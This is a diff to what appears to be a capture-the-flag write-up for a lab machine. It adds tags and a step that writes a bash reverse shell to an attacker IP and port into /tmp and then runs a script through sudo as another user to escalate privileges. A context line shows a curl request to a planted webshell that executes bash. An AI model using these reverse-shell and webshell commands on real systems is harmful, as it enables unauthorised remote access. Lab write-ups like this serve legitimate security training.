@@ -1,5 +1,8 @@
 ```
 SQL injection
+Webshell
+sudo -l
+Reverse Shell - Bash
 ```
 
 ```
@@ -58,5 +61,12 @@ curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash 
 ![image](https://user-images.githubusercontent.com/33616880/231972255-3fcdf22f-ef68-4a2a-87b3-c189d8936720.png)
 
 
+
+```
+echo 'bash -c "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"' > /tmp/shell.sh
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+```
+![image](https://user-images.githubusercontent.com/33616880/231977903-441bb61c-6dad-427e-9d5f-387558289cf6.png)
+![image](https://user-images.githubusercontent.com/33616880/231977956-2ac3c680-de93-4e87-8b3c-91a432c7efa6.png)
 
 
